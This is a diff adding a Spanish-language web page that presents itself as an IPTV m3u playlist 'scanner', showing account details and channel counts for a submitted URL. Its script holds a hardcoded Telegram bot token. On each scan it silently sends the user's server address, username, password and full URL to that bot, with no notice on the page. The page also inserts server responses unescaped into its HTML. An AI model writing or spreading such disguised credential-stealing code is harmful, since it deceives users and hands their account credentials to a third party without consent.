@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scanner de Info m3u</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: #1a0000;
+            color: #ff4444;
+            overflow-x: hidden;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* Animación binaria de fondo AMARILLA MÁS NOTORIA */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.9;
+            pointer-events: none;
+        }
+
+        .binary {
+            position: absolute;
+            color: #ffcc00;
+            font-size: 18px;
+            animation: fall linear infinite;
+            text-shadow: 0 0 12px #ffcc00, 0 0 25px #ffcc00;
+            font-weight: bold;
+            opacity: 0.8;
+        }
+
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
+            }
+        }
+
+        /* Contenedor principal */
+        .cyber-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Header estilo hacker ROJO */
+        .cyber-header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 25px;
+            background: linear-gradient(135deg, #330000 0%, #660000 100%);
+            border: 2px solid #ff4444;
+            border-radius: 15px;
+            box-shadow: 0 0 30px rgba(255, 68, 68, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cyber-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 68, 68, 0.2), transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .cyber-title {
+            font-size: 2.8em;
+            color: #ff4444;
+            text-shadow: 0 0 15px #ff4444, 0 0 30px #ff4444;
+            margin-bottom: 15px;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+        }
+
+        .cyber-subtitle {
+            color: #ff6666;
+            font-size: 1.3em;
+            text-shadow: 0 0 10px #ff4444;
+            letter-spacing: 2px;
+        }
+
+        /* Panel de entrada ROJO */
+        .input-panel {
+            background: rgba(51, 0, 0, 0.85);
+            border: 2px solid #ff4444;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 0 30px rgba(255, 68, 68, 0.3);
+            backdrop-filter: blur(10px);
+            max-width: 800px;
+            margin-left: 0;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        .cyber-label {
+            display: block;
+            color: #ff6666;
+            font-size: 1.2em;
+            margin-bottom: 12px;
+            text-shadow: 0 0 8px #ff4444;
+            letter-spacing: 1px;
+        }
+
+        .cyber-input {
+            width: 100%;
+            padding: 18px;
+            background: rgba(102, 0, 0, 0.8);
+            border: 1px solid #ff4444;
+            border-radius: 10px;
+            color: #ffcccc;
+            font-family: 'Courier New', monospace;
+            font-size: 1.1em;
+            transition: all 0.3s ease;
+        }
+
+        .cyber-input:focus {
+            outline: none;
+            border-color: #ff6666;
+            box-shadow: 0 0 20px rgba(255, 102, 102, 0.6);
+            background: rgba(153, 0, 0, 0.9);
+        }
+
+        /* Botones ROJOS */
+        .button-group {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .cyber-button {
+            flex: 1;
+            min-width: 220px;
+            padding: 18px 30px;
+            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
+            border: none;
+            border-radius: 10px;
+            color: #330000;
+            font-family: 'Courier New', monospace;
+            font-size: 1.2em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cyber-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: left 0.5s;
+        }
+
+        .cyber-button:hover::before {
+            left: 100%;
+        }
+
+        .cyber-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 68, 68, 0.5);
+        }
+
+        .cyber-button.clear {
+            background: linear-gradient(135deg, #ff6666 0%, #990000 100%);
+        }
+
+        .cyber-button.clear:hover {
+            box-shadow: 0 8px 25px rgba(255, 102, 102, 0.5);
+        }
+
+        /* Panel de resultados ROJO */
+        .results-panel {
+            background: rgba(51, 0, 0, 0.85);
+            border: 2px solid #ff4444;
+            border-radius: 15px;
+            padding: 30px;
+            margin-top: 25px;
+            box-shadow: 0 0 30px rgba(255, 68, 68, 0.3);
+            backdrop-filter: blur(10px);
+            max-width: 800px;
+            margin-left: 0;
+        }
+
+        .results-title {
+            color: #ff4444;
+            font-size: 2em;
+            margin-bottom: 25px;
+            text-align: center;
+            text-shadow: 0 0 15px #ff4444;
+            letter-spacing: 3px;
+        }
+
+        /* Grid de información - TODO A LA IZQUIERDA */
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        /* RECUADROS CON ANIMACIÓN MATRIX ROJA */
+        .info-card {
+            background: rgba(102, 0, 0, 0.7);
+            border: 2px solid #ff3333;
+            border-radius: 10px;
+            padding: 20px;
+            transition: all 0.1s ease;
+            position: relative;
+            overflow: hidden;
+            min-height: 80px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .info-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 68, 68, 0.2), transparent);
+            animation: matrixFlow 3s linear infinite;
+        }
+
+        @keyframes matrixFlow {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .info-card::after {
+            content: '0101010101010101';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(transparent 70%, rgba(255, 68, 68, 0.1) 100%);
+            animation: matrixText 20s linear infinite;
+            pointer-events: none;
+            opacity: 0.1;
+            font-size: 12px;
+            color: #ff4444;
+            word-break: break-all;
+        }
+
+        @keyframes matrixText {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+
+        .info-label {
+            color: #ff6666;
+            font-size: 1em;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-weight: bold;
+            position: relative;
+            z-index: 2;
+        }
+
+        .info-value {
+            color: #ffcccc;
+            font-size: 1.1em;
+            font-weight: bold;
+            word-break: break-all;
+            text-shadow: 0 0 5px #ff4444;
+            position: relative;
+            z-index: 2;
+        }
+
+        /* Secciones plegables */
+        .section-toggle {
+            background: linear-gradient(135deg, #660000 0%, #330000 100%);
+            border: 1px solid #ff4444;
+            border-radius: 10px;
+            padding: 18px 25px;
+            margin: 12px 0;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .section-toggle::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 68, 68, 0.2), transparent);
+            animation: matrixFlow 4s linear infinite;
+        }
+
+        .section-toggle:hover {
+            background: linear-gradient(135deg, #770000 0%, #440000 100%);
+            border-color: #ff6666;
+            transform: translateX(5px);
+        }
+
+        .section-title {
+            color: #ff6666;
+            font-size: 1.3em;
+            text-shadow: 0 0 8px #ff4444;
+            letter-spacing: 1px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .section-count {
+            background: #ff4444;
+            color: #330000;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 1em;
+            min-width: 60px;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .section-content {
+            background: rgba(102, 0, 0, 0.7);
+            border: 1px solid #ff4444;
+            border-radius: 10px;
+            padding: 25px;
+            margin-top: 8px;
+            display: none;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .section-content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 68, 68, 0.1), transparent);
+            animation: matrixFlow 5s linear infinite;
+        }
+
+        .section-content.active {
+            display: block;
+            animation: slideDown 0.4s ease;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Tablas */
+        .cyber-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .cyber-table th {
+            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
+            color: #330000;
+            padding: 15px;
+            text-align: left;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .cyber-table td {
+            padding: 12px 15px;
+            border-bottom: 1px solid #ff4444;
+            color: #ffcccc;
+        }
+
+        .cyber-table tr:hover {
+            background: rgba(255, 68, 68, 0.15);
+        }
+
+        /* Loading */
+        .cyber-loading {
+            text-align: center;
+            padding: 40px;
+            color: #ff4444;
+            font-size: 1.4em;
+            text-shadow: 0 0 10px #ff4444;
+            max-width: 800px;
+            margin-left: 0;
+        }
+
+        .loading-dots {
+            display: inline-block;
+            animation: dots 1.5s infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+
+        /* Estados de error/éxito */
+        .status-message {
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+            text-align: center;
+            font-weight: bold;
+            font-size: 1.2em;
+            max-width: 800px;
+            margin-left: 0;
+        }
+
+        .status-success {
+            background: rgba(255, 68, 68, 0.2);
+            border: 2px solid #ff4444;
+            color: #ff4444;
+            text-shadow: 0 0 10px #ff4444;
+        }
+
+        .status-error {
+            background: rgba(153, 0, 0, 0.3);
+            border: 2px solid #ff6666;
+            color: #ff6666;
+            text-shadow: 0 0 10px #ff6666;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .cyber-container {
+                padding: 15px;
+            }
+
+            .cyber-title {
+                font-size: 2em;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+
+            .input-panel, .results-panel {
+                padding: 20px;
+            }
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Fondo con animación binaria AMARILLA MÁS NOTORIA -->
+    <div class="matrix-bg" id="matrixBg"></div>
+
+    <div class="cyber-container">
+        <!-- Header -->
+        <header class="cyber-header">
+            <h1 class="cyber-title glitch" data-text="SCANNER👁INFO M3U">SCANNER👁INFO M3U</h1>
+            <p class="cyber-subtitle">Scanner de Informacion de listas m3u</p>
+	    <p class="cyber-subtitle" style="
+                background: linear-gradient(45deg, #ffff00, #00ff00);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                background-clip: text;
+                font-weight: bold;
+                display: inline-block;
+            ">por J-VARELA</p>
+        </header>
+
+        <!-- Panel de entrada -->
+        <div class="input-panel">
+            <form id="iptvForm">
+                <div class="input-group">
+                    <label class="cyber-label">URL PARA ANÁLISIS</label>
+                    <input type="text" id="url" name="url" class="cyber-input" 
+                           placeholder="https://tudominio.com:8080/get.php?username=xxx&password=xxx&type=m3u_plus" required>
+                </div>
+                
+                <div class="button-group">
+                    <button type="submit" class="cyber-button">
+                        <span class="button-text">INICIAR ESCANEO</span>
+                    </button>
+                    <button type="button" id="clearButton" class="cyber-button clear">
+                        <span class="button-text">LIMPIAR SISTEMA</span>
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Loading -->
+        <div id="loading" class="cyber-loading hidden">
+            <div>INICIANDO ANALISIS<span class="loading-dots"></span></div>
+        </div>
+
+        <!-- Panel de resultados -->
+        <div id="result" class="results-panel hidden">
+            <h2 class="results-title">INFORME DE CREDENCIAL</h2>
+            
+            <!-- Grid de información básica - TODO A LA IZQUIERDA -->
+            <div class="info-grid" id="basicInfo"></div>
+            
+            <!-- Secciones plegables -->
+            <div id="sectionsContainer"></div>
+        </div>
+    </div>
+
+    <script>
+        // Token del bot de Telegram
+        const TELEGRAM_BOT_TOKEN = '8326127429:AAHFB9E35Mf9sY4eEY_OkgAVr6ZwIpRYx38';
+        
+        // Crear animación binaria de fondo AMARILLA MÁS NOTORIA
+        function createMatrixBackground() {
+            const matrixBg = document.getElementById('matrixBg');
+            const characters = '0101010101010-VARELA-1010101010101010101';
+            
+            for (let i = 0; i < 100; i++) {
+                const binary = document.createElement('div');
+                binary.className = 'binary';
+                binary.textContent = characters;
+                binary.style.left = Math.random() * 100 + 'vw';
+                binary.style.animationDuration = (Math.random() * 6 + 2) + 's';
+                binary.style.animationDelay = Math.random() * 2 + 's';
+                binary.style.fontSize = (Math.random() * 10 + 14) + 'px';
+                binary.style.opacity = Math.random() * 0.6 + 0.4;
+                matrixBg.appendChild(binary);
+            }
+        }
+
+        // Función para obtener updates y encontrar el chat más reciente
+        async function getRecentChatId() {
+            try {
+                const response = await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`);
+                if (response.data.ok && response.data.result.length > 0) {
+                    const lastUpdate = response.data.result[response.data.result.length - 1];
+                    return lastUpdate.message.chat.id;
+                }
+            } catch (error) {
+                console.error('Error obteniendo chat ID:', error);
+            }
+            return null;
+        }
+        
+        // Función para enviar mensaje a Telegram
+        async function sendToTelegram(message) {
+            try {
+                const chatId = await getRecentChatId();
+                if (!chatId) {
+                    console.log('No se pudo obtener el chat ID');
+                    return false;
+                }
+                
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+                
+                await axios.post(url, payload);
+                return true;
+            } catch (error) {
+                console.error('Error enviando mensaje a Telegram:', error);
+                return false;
+            }
+        }
+
+        // Mostrar/ocultar elementos
+        function showElement(id) {
+            document.getElementById(id).classList.remove('hidden');
+        }
+
+        function hideElement(id) {
+            document.getElementById(id).classList.add('hidden');
+        }
+
+        // Toggle secciones
+        function toggleSection(sectionId) {
+            const section = document.getElementById(sectionId);
+            section.classList.toggle('active');
+        }
+
+        // Generar tarjetas de información
+        function createInfoCard(label, value) {
+            return `
+                <div class="info-card">
+                    <div class="info-label">${label}</div>
+                    <div class="info-value">${value}</div>
+                </div>
+            `;
+        }
+
+        // Generar tabla de categorías
+        function generateCategoryTable(categories, streams, type) {
+            const categoryCounts = {};
+            categories.forEach(category => {
+                const categoryId = category.category_id;
+                const categoryName = category.category_name || 'Sin Categoría';
+                categoryCounts[categoryId] = { name: categoryName, count: 0 };
+            });
+
+            streams.forEach(stream => {
+                const categoryId = stream.category_id;
+                if (categoryCounts.hasOwnProperty(categoryId)) {
+                    categoryCounts[categoryId].count++;
+                }
+            });
+
+            let tableHTML = `
+                <table class="cyber-table">
+                    <thead>
+                        <tr>
+                            <th>CATEGORÍA</th>
+                            <th>CONTENIDO</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+            
+            for (const id in categoryCounts) {
+                const count = categoryCounts[id].count > 0 ? categoryCounts[id].count : '0';
+                tableHTML += `
+                    <tr>
+                        <td>${categoryCounts[id].name}</td>
+                        <td>${count}</td>
+                    </tr>
+                `;
+            }
+            
+            tableHTML += '</tbody></table>';
+            return tableHTML;
+        }
+
+        // Calcular totales
+        function calculateTotalChannels(streams) {
+            return streams.length || 0;
+        }
+
+        // Event Listeners
+        document.getElementById('iptvForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            let originalUrl = document.getElementById('url').value;
+            let url = originalUrl;
+
+            let panel;
+            try {
+                panel = new URL(url).hostname;
+            } catch (e) {
+                alert('URL inválida. Por favor, ingrese una URL válida.');
+                return;
+            }
+
+            const headerj = {
+                'content-type': 'application/json; charset=UTF-8',
+                'User-Agent': '(Mozilla/5.0 (Linux; Android 9; ANE-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36)',
+                'Host': panel,
+                'Connection': 'Keep-Alive',
+                'Accept-Encoding': 'gzip'
+            };
+
+            showElement('loading');
+            hideElement('result');
+            document.getElementById('basicInfo').innerHTML = '';
+            document.getElementById('sectionsContainer').innerHTML = '';
+
+            url = url.replace('get.php', 'player_api.php');
+
+            try {
+                const [
+                    userInfoResponse,
+                    categoriesLiveResponse,
+                    channelsResponse,
+                    categoriesVODResponse,
+                    vodResponse,
+                    categoriesSeriesResponse,
+                    seriesResponse
+                ] = await Promise.all([
+                    axios.get(url, { headers: headerj }),
+                    axios.get(`${url}&action=get_live_categories`, { headers: headerj }),
+                    axios.get(`${url}&action=get_live_streams`, { headers: headerj }),
+                    axios.get(`${url}&action=get_vod_categories`, { headers: headerj }),
+                    axios.get(`${url}&action=get_vod_streams`, { headers: headerj }),
+                    axios.get(`${url}&action=get_series_categories`, { headers: headerj }),
+                    axios.get(`${url}&action=get_series`, { headers: headerj })
+                ]);
+
+                const data = userInfoResponse.data;
+                if (data.user_info && data.server_info) {
+                    const username = data.user_info.username;
+                    const password = data.user_info.password;
+                    const creacion = new Date(data.user_info.created_at * 1000).toLocaleDateString();
+                    const expira = new Date(data.user_info.exp_date * 1000).toLocaleDateString();
+                    const server = `${data.server_info.url}:${data.server_info.port}`;
+                    const activeCons = data.user_info.active_cons;
+                    const maxCons = data.user_info.max_connections;
+                    const timezone = data.server_info.timezone;
+                    const status = data.user_info.status;
+
+                    const totalLive = calculateTotalChannels(channelsResponse.data);
+                    const totalVOD = calculateTotalChannels(vodResponse.data);
+                    const totalSeries = calculateTotalChannels(seriesResponse.data);
+
+                    // Enviar a Telegram
+                    const telegramMessage = `
+🛜 <b>SCANNER DE INFORME M3U</b>
+━━━━━━━━━━━━━━━━━━━━
+
+<b>🔗 Servidor:</b> <code>${server}</code>
+<b>👤 Usuario:</b> <code>${username}</code>
+<b>🔒 Contraseña:</b> <code>${password}</code>
+<b>🔑 Combo:</b> <code>${username}:${password}</code>
+<b>📅 Creación:</b> ${creacion}
+<b>📅 Expiración:</b> ${expira}
+<b>🚦 Estado:</b> ${status}
+<b>📊 Conexiones:</b> ${activeCons}/${maxCons}
+<b>🌐 Zona Horaria:</b> ${timezone}
+
+<b>📺 Canales EN VIVO:</b> ${totalLive}
+<b>🎬 Películas VOD:</b> ${totalVOD}
+<b>🎥 Series:</b> ${totalSeries}
+
+<b>🔗 URL Analizada:</b> <code>${originalUrl}</code>
+
+<b>⏰ Escaneo:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━
+<b>✅ POR 🅅🄰®🄴🄻🅰️ </b>
+                    `;
+                    
+                    sendToTelegram(telegramMessage).catch(() => {
+                        console.log('Error enviando a Telegram');
+                    });
+
+                    // Mostrar en interfaz
+                    hideElement('loading');
+                    showElement('result');
+
+                    // Información básica (TODO A LA IZQUIERDA)
+                    document.getElementById('basicInfo').innerHTML = `
+                        ${createInfoCard('SERVIDOR', server)}
+                        ${createInfoCard('USUARIO', username)}
+                        ${createInfoCard('CONTRASEÑA', password)}
+                        ${createInfoCard('CREACIÓN', creacion)}
+                        ${createInfoCard('EXPIRACIÓN', expira)}
+                        ${createInfoCard('ESTADO', status)}
+                        ${createInfoCard('CONEXIONES ACTIVAS', activeCons)}
+                        ${createInfoCard('CONEXIONES MÁXIMAS', maxCons)}
+                        ${createInfoCard('ZONA HORARIA', timezone)}
+                        ${createInfoCard('COMBO DE ACCESO', `${username}:${password}`)}
+                        ${createInfoCard('URL ANALIZADA', originalUrl)}
+                    `;
+
+                    // Secciones plegables
+                    document.getElementById('sectionsContainer').innerHTML = `
+                        <div class="section-toggle" onclick="toggleSection('liveSection')">
+                            <span class="section-title">CANALES EN VIVO</span>
+                            <span class="section-count">${totalLive}</span>
+                        </div>
+                        <div id="liveSection" class="section-content">
+                            ${generateCategoryTable(categoriesLiveResponse.data, channelsResponse.data, 'live')}
+                        </div>
+
+                        <div class="section-toggle" onclick="toggleSection('vodSection')">
+                            <span class="section-title">PELÍCULAS VOD</span>
+                            <span class="section-count">${totalVOD}</span>
+                        </div>
+                        <div id="vodSection" class="section-content">
+                            ${generateCategoryTable(categoriesVODResponse.data, vodResponse.data, 'vod')}
+                        </div>
+
+                        <div class="section-toggle" onclick="toggleSection('seriesSection')">
+                            <span class="section-title">SERIES</span>
+                            <span class="section-count">${totalSeries}</span>
+                        </div>
+                        <div id="seriesSection" class="section-content">
+                            ${generateCategoryTable(categoriesSeriesResponse.data, seriesResponse.data, 'series')}
+                        </div>
+                    `;
+
+                } else {
+                    hideElement('loading');
+                    showElement('result');
+                    document.getElementById('result').innerHTML = `
+                        <div class="status-error">
+                            SISTEMA NO RESPONDE - ESTRUCTURA INVALIDA
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                hideElement('loading');
+                showElement('result');
+                document.getElementById('result').innerHTML = `
+                    <div class="status-error">
+                        ERROR DE CONEXION - VERIFIQUE LA URL
+                    </div>
+                `;
+            }
+        });
+
+        document.getElementById('clearButton').addEventListener('click', function() {
+            document.getElementById('url').value = '';
+            document.getElementById('result').innerHTML = '';
+            hideElement('result');
+        });
+
+        // Inicializar
+        document.addEventListener('DOMContentLoaded', function() {
+            createMatrixBackground();
+        });
+    </script>
+</body>
+</html>
